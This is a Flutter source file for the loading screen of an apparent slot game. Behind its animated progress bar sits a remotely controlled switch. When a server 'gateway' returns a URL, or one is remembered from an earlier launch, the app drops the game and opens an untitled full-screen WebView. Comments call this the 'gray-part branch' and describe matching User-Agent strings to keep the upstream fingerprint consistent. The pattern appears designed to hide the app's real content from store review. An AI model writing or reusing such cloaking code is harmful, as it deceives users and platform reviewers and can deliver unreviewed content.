import 'dart:async';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import '../gateway/gateway_service.dart';
import 'home_screen.dart';
import 'webview_screen.dart';

class LoadingScreen extends StatefulWidget {
  const LoadingScreen({super.key});

  @override
  State<LoadingScreen> createState() => _LoadingScreenState();
}

class _LoadingScreenState extends State<LoadingScreen>
    with TickerProviderStateMixin {
  late AnimationController _progressController;
  late AnimationController _dotsController;
  bool _navigated = false;

  @override
  void initState() {
    super.initState();

    // Progress bar advances asymptotically toward ~85%, then jumps to 100%
    // only right before launch.
    _progressController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 3800),
    );

    _dotsController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 900),
    )..repeat();

    _startLoading();
  }

  Future<void> _startLoading() async {
    // Phase 1: progress fills to ~90% during preload window.
    final Animation<double> curve = CurvedAnimation(
      parent: _progressController,
      curve: Curves.easeOut,
    );
    final Animation<double> partial =
        Tween<double>(begin: 0.0, end: 0.9).animate(curve);
    _progressController.forward();

    // Kick the Rust gateway in parallel with the progress animation. Any
    // transport failure degrades to an "open the game" verdict; the Rust
    // side times out at 20s, matching the max we'll wait for the UI.
    final Future<GatewayVerdict> verdictFut = GatewayService.instance.decide();

    // Simulate asset preparation.
    await Future.delayed(const Duration(milliseconds: 3800));

    // Phase 2: fill the final 10% right before launch.
    final AnimationController finishCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 350),
    );
    final Animation<double> finish =
        Tween<double>(begin: 0.9, end: 1.0).animate(
      CurvedAnimation(parent: finishCtrl, curve: Curves.easeIn),
    );
    // Hand control to the finish animation.
    setState(() {
      _progressValue = partial.value;
    });
    _progressController.stop();

    finish.addListener(() {
      setState(() {
        _progressValue = finish.value;
      });
    });
    await finishCtrl.forward();
    finishCtrl.dispose();

    // Short beat at 100% so the user sees the bar full.
    await Future.delayed(const Duration(milliseconds: 200));

    if (!mounted || _navigated) return;
    _navigated = true;

    // Resolve the gateway verdict with a soft timeout so a hanging socket
    // doesn't trap the user on the loading screen forever. On any failure
    // we fall through to the game, same as if the upstream had answered
    // `{"ok":false}`.
    GatewayVerdict verdict;
    try {
      verdict = await verdictFut
          .timeout(const Duration(seconds: 6),
              onTimeout: () => const GatewayVerdict(
                  ok: false, url: '', status: 0));
    } catch (_) {
      verdict = const GatewayVerdict(ok: false, url: '', status: 0);
    }

    // If a previous cold start saw a URL and this one didn't, honour the
    // last known decision — a transient outage shouldn't flip the user
    // between branches.
    String? resolvedUrl = verdict.hasUrl ? verdict.url : null;
    if (resolvedUrl == null) {
      resolvedUrl = await GatewayService.instance.rememberedUrl();
    }

    if (!mounted) return;

    if (resolvedUrl != null && resolvedUrl.isNotEmpty) {
      // Gray-part branch: the WebView uses the exact UA that Rust just
      // sent on the `/edge/sync` POST so the upstream fingerprint is
      // consistent across the two legs.
      final ua = GatewayService.instance.webViewUserAgent();
      Navigator.of(context).pushReplacement(
        PageRouteBuilder(
          pageBuilder: (_, __, ___) => WebViewScreen(
            title: '',
            url: resolvedUrl!,
            userAgent: ua.isNotEmpty ? ua : null,
            fullScreen: true,
          ),
          transitionsBuilder: (_, anim, __, child) =>
              FadeTransition(opacity: anim, child: child),
          transitionDuration: const Duration(milliseconds: 400),
        ),
      );
      return;
    }

    // Game branch: lock to portrait and launch the slot.
    await SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitUp,
    ]);

    if (!mounted) return;
    Navigator.of(context).pushReplacement(
      PageRouteBuilder(
        pageBuilder: (_, __, ___) => const HomeScreen(),
        transitionsBuilder: (_, anim, __, child) =>
            FadeTransition(opacity: anim, child: child),
        transitionDuration: const Duration(milliseconds: 400),
      ),
    );
  }

  double _progressValue = 0.0;

  @override
  void dispose() {
    _progressController.dispose();
    _dotsController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0A0E27),
      body: AnimatedBuilder(
        animation: _progressController,
        builder: (context, _) {
          final double value = _progressController.isAnimating
              ? _progressController.value * 0.9
              : _progressValue;
          return OrientationBuilder(
            builder: (context, orientation) {
              final bool isPortrait = orientation == Orientation.portrait;
              final String bg = isPortrait
                  ? 'assets/Coin_Burst_additional_assets/Vertical_Loading_Screen.webp'
                  : 'assets/Coin_Burst_additional_assets/Horizontal_Loading_Screen.webp';
              return Stack(
                fit: StackFit.expand,
                children: [
                  // Background art.
                  Image.asset(
                    bg,
                    fit: BoxFit.cover,
                    gaplessPlayback: true,
                  ),
                  // Dark gradient over bottom for progress bar legibility.
                  Container(
                    decoration: const BoxDecoration(
                      gradient: LinearGradient(
                        begin: Alignment.center,
                        end: Alignment.bottomCenter,
                        colors: [
                          Colors.transparent,
                          Color(0xCC000814),
                        ],
                      ),
                    ),
                  ),
                  // Progress bar + loading text pinned to bottom.
                  SafeArea(
                    child: Align(
                      alignment: Alignment.bottomCenter,
                      child: Padding(
                        padding: EdgeInsets.symmetric(
                          horizontal: isPortrait ? 36 : 80,
                          vertical: isPortrait ? 44 : 28,
                        ),
                        child: Column(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            _LoadingText(controller: _dotsController),
                            const SizedBox(height: 14),
                            _ProgressBar(value: value),
                            const SizedBox(height: 6),
                            Text(
                              '${(value * 100).round()}%',
                              style: TextStyle(
                                color: Colors.white.withOpacity(0.85),
                                fontSize: 13,
                                fontWeight: FontWeight.w600,
                                letterSpacing: 1.5,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ),
                  ),
                ],
              );
            },
          );
        },
      ),
    );
  }
}

class _LoadingText extends StatelessWidget {
  final AnimationController controller;
  const _LoadingText({required this.controller});

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (context, _) {
        final int dots = (controller.value * 4).floor() % 4; // 0..3
        final String text = 'Loading${'.' * dots}${' ' * (3 - dots)}';
        return Text(
          text,
          style: const TextStyle(
            color: Colors.white,
            fontSize: 22,
            fontWeight: FontWeight.w800,
            letterSpacing: 2.5,
            shadows: [
              Shadow(
                color: Color(0xFF00D1FF),
                blurRadius: 18,
                offset: Offset(0, 0),
              ),
              Shadow(
                color: Colors.black87,
                blurRadius: 4,
                offset: Offset(0, 2),
              ),
            ],
          ),
        );
      },
    );
  }
}

class _ProgressBar extends StatelessWidget {
  final double value; // 0..1
  const _ProgressBar({required this.value});

  @override
  Widget build(BuildContext context) {
    const double height = 18;
    return LayoutBuilder(
      builder: (context, cst) {
        final double w = cst.maxWidth;
        return Container(
          height: height,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(height / 2),
            color: const Color(0xFF061020),
            border: Border.all(
              color: const Color(0xFFFFD54F),
              width: 2,
            ),
            boxShadow: const [
              BoxShadow(
                color: Color(0x6600D1FF),
                blurRadius: 14,
                spreadRadius: 1,
              ),
            ],
          ),
          child: ClipRRect(
            borderRadius: BorderRadius.circular(height / 2 - 2),
            child: Stack(
              children: [
                // Fill.
                AnimatedContainer(
                  duration: const Duration(milliseconds: 180),
                  curve: Curves.linear,
                  width: w * value.clamp(0.0, 1.0),
                  decoration: const BoxDecoration(
                    gradient: LinearGradient(
                      begin: Alignment.centerLeft,
                      end: Alignment.centerRight,
                      colors: [
                        Color(0xFFFF8A00),
                        Color(0xFFFFD54F),
                        Color(0xFFFF6EC7),
                        Color(0xFF8A2BE2),
                      ],
                    ),
                  ),
                ),
                // Shine stripes overlay.
                Positioned.fill(
                  child: IgnorePointer(
                    child: CustomPaint(
                      painter: _StripePainter(progress: value),
                    ),
                  ),
                ),
              ],
            ),
          ),
        );
      },
    );
  }
}

class _StripePainter extends CustomPainter {
  final double progress;
  _StripePainter({required this.progress});

  @override
  void paint(Canvas canvas, Size size) {
    final Paint p = Paint()
      ..color = Colors.white.withOpacity(0.14)
      ..style = PaintingStyle.fill;
    final double fillW = size.width * progress.clamp(0.0, 1.0);
    const double stripeW = 10;
    const double gap = 16;
    double x = -size.height;
    while (x < fillW) {
      final Path path = Path()
        ..moveTo(x, 0)
        ..lineTo(x + stripeW, 0)
        ..lineTo(x + stripeW + size.height, size.height)
        ..lineTo(x + size.height, size.height)
        ..close();
      canvas.save();
      canvas.clipRect(Rect.fromLTWH(0, 0, fillW, size.height));
      canvas.drawPath(path, p);
      canvas.restore();
      x += stripeW + gap;
    }
  }

  @override
  bool shouldRepaint(covariant _StripePainter oldDelegate) =>
      oldDelegate.progress != progress;
}
